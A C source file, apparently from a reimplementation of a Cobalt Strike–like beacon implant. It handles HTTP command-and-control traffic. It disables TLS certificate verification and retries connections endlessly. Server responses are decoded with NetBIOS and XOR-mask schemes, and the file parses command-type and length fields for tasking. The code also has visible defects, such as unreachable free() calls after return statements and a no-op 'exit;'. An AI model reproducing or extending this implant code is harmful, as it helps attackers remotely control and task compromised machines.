#include "Http.h"
#include "Config.h"
#include "Util.h"

#define MAX_HEADER_SIZE 1024

//typedef struct {
//    size_t respsize;
//    char* resqresult;
//}perform_requestresult;

// 函数用于处理HTTP响应
size_t write_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
    size_t real_size = size * nmemb;
    perform_requestresult* mem = (perform_requestresult*)userdata;

    mem->resqresult = realloc(mem->resqresult, mem->respsize + real_size + 1);
    if (mem->resqresult == NULL) {
        printf("Failed to allocate memory\n");
        return 0;
    }

    memcpy(&(mem->resqresult[mem->respsize]), ptr, real_size);
    mem->respsize += real_size;
    mem->resqresult[mem->respsize] = 0;

    return real_size;
}

perform_requestresult perform_post_request(unsigned char* url, struct curl_slist* headers, const char* postData) {
    CURL* curl;
    CURLcode res;

    // 初始化CURL句柄
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        exit(EXIT_FAILURE);
    }

    perform_requestresult chunk;
    chunk.resqresult = malloc(1);
    if (chunk.resqresult == NULL) {
        fprintf(stderr, "Failed to allocate memory\n");
        curl_easy_cleanup(curl);
        exit(EXIT_FAILURE);
    }
    chunk.respsize = 0;



    // 将请求头添加到CURL请求中
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    // 设置请求URL
    curl_easy_setopt(curl, CURLOPT_URL, url);
    // 设置POST请求
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    // 设置POST数据
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);
    // 设置响应数据处理回调函数
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    // 传递 received_size 变量作为 CURLOPT_WRITEDATA 的参数
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
    //url_easy_setopt(curl, CURLOPT_PROXY, "192.168.203.111:111");
    // 禁用对目标服务器证书的验证
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    //查看调试细节
    //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    while (1) {
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            printf("\nCONNECT HTTP Error\n");
            Sleep(1000);
        }
        else {
            chunk.code = (int)res;
            curl_easy_cleanup(curl);
            return chunk;
        }
    }
}

// 函数用于执行HTTP GET请求，并设置请求头
perform_requestresult perform_get_request(unsigned char* url, struct curl_slist* headers) {
    CURL* curl;
    CURLcode res;

    // 初始化CURL句柄
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        exit;
    }
    perform_requestresult chunk;
    chunk.resqresult = malloc(1);
    if (chunk.resqresult == NULL) {
        fprintf(stderr, "Failed to allocate memory\n");
        curl_easy_cleanup(curl);
        exit(EXIT_FAILURE);
    }
    chunk.respsize = 0;
    // 将请求头添加到CURL请求中
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    // 设置请求URL
    curl_easy_setopt(curl, CURLOPT_URL, url);
    // 设置响应数据处理回调函数
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    // 传递 received_size 变量作为 CURLOPT_WRITEDATA 的参数
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
    // 执行HTTP GET请求
    //curl_easy_setopt(curl, CURLOPT_PROXY, "192.168.203.111:111");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    while (1) {
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            printf("\nCONNECT HTTP Error\n");
            Sleep(1000);
        }
        else
        {
            chunk.code = (int)res;
            curl_easy_cleanup(curl);
            return chunk;

        }
    
    }
}

char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
    size_t prefixLen = strlen(prefix);
    size_t suffixLen = strlen(suffix);
    size_t dataLen = strlen(data);
    


    if (strncmp(data, prefix, prefixLen) == 0 &&
        strncmp(data + (dataLen - suffixLen), suffix, suffixLen) == 0) {
        data[dataLen - suffixLen] = '\0';
        return data + prefixLen;
    }

    return data; // Return original data if prefix/suffix not found
}

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* responsedatalen) {
    //printf("\n parseGetResponse %s \n ", data);
    data = removePrefixAndSuffix(data, Response_prepend, Response_append);
    
   /* printf("\n parseGetResponse %s \n ", data);
    printf("EncryMetadata Encrypted data (hex)1111111: %d \n" , strlen(data));
    for (int i = 0; i < strlen(data); ++i) {
    printf("%d, ", data[i]);
    }
    printf("\n");*/
    //int data_length = strlen(data);
    int data_length = strlen(data);
    unsigned char netbiosKey = 'a'; // Replace 'a' with your desired key
    size_t NetbiosDecodedatalen;
    unsigned char* NetbiosDecodedata = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&NetbiosDecodedatalen);
    //printf("NetbiosDecodedata222222222: %d  \n", NetbiosDecodedatalen);
    //for (int i = 0; i < NetbiosDecodedatalen; ++i) {
    //    printf("%d, ", NetbiosDecodedata[i]); // 这里应该修改为打印解码后的数据，例如 data[i] -> NetbiosDecode 后的结果
    //}
    //printf("\n");
    // Printing the result after NetbiosDecode
    //printf("After NetbiosDecode22222222: %s", data);
    printf("\n");
    unsigned char* first = "1234";
    if (NetbiosDecodedatalen < 5) {
        *responsedatalen = 4;
        return first;
        free(NetbiosDecodedata);
    }
    // MaskDecode: Perform the MaskDecode operation after NetbiosDecode
    unsigned char key[] = { NetbiosDecodedata[0], NetbiosDecodedata[1], NetbiosDecodedata[2], NetbiosDecodedata[3] }; // Extract first 4 bytes as key
    int key_length = sizeof(key) / sizeof(key[0]);
    size_t MaskDecodedatalen = NetbiosDecodedatalen - 4;
    unsigned char* MaskDecodedata= MaskDecode((unsigned char*)&NetbiosDecodedata[4], MaskDecodedatalen, key, key_length);
    printf("EncryMetadata Encrypted data (hex)333333: %d  \n", MaskDecodedatalen);
    /*for (int i = 0; i < MaskDecodedatalen; ++i) {
        printf("%d, ", MaskDecodedata[i]);
    }
    printf("\n");
    for (int i = 0; i < MaskDecodedatalen; ++i) {
        printf("%d, ", MaskDecodedata[i]);
    }
    printf("\n");*/
    // Printing the final result after MaskDecode
    //printf("After MaskDecode: %s\n", MaskDecodedata);
    *responsedatalen = MaskDecodedatalen;
    return MaskDecodedata;
    free(NetbiosDecodedata);
    free(MaskDecodedata);
}


unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLen, uint32_t* commandType ,size_t* commandBuflen , size_t* jia, int* jiaci) {
    unsigned char* decryptedBuf1;
    if (*jia > 0) {

        decryptedBuf1 = decryptedBuf + (int)*jia + *jiaci * 8;
        *jiaci += 1;
    }
    else
    {
        decryptedBuf1 = decryptedBuf;
    }
    uint8_t commandTypeBytes[4];
    unsigned char* commandTypeBytesStart = decryptedBuf1;
    memcpy(&commandTypeBytes, commandTypeBytesStart, 4);
    *commandType = bigEndianUint32(commandTypeBytes);
  /*  printf("\ncommandTypeBytes   \n");
    for (int i = 0; i < sizeof(commandTypeBytes); i++) {
        printf("%d ", commandTypeBytes[i]);
    }*/


    uint8_t commandLenBytes[4];
    unsigned char* commandLenBytessStart = decryptedBuf1 + 4;
    memcpy(&commandLenBytes, commandLenBytessStart, 4);
    uint32_t commandLen = bigEndianUint32(commandLenBytes);
   /* printf("\n commandLenBytes   %d\n ",sizeof(commandLenBytes));
    for (int i = 0; i < sizeof(commandLenBytes); i++) {
        printf("%d ", commandLenBytes[i]);
    }*/
    //unsigned char* commanddata = (unsigned char*)malloc(len * sizeof(uint8_t));
    unsigned char* commandBuf = (unsigned char*)malloc(commandLen);
    unsigned char* commandBufStart = decryptedBuf1 + 8;
    memcpy(commandBuf, commandBufStart, commandLen);
   /* printf("\n commanddata   %d\n",commandLen);
    for (int i = 0; i < commandLen; i++) {
        printf("%d ", commandBuf[i]);
    }*/
    // 模拟从缓冲区中读取 Command Length
    // 更新 totalLen
    
    *totalLen = *totalLen - (4 + 4 + commandLen);
    *commandBuflen = commandLen;
    *jia = *jia+ commandLen;
    return commandBuf;
    free(commandTypeBytesStart);
    free(commandLenBytessStart);
    free(commandBuf);
    free(commandBufStart);
}
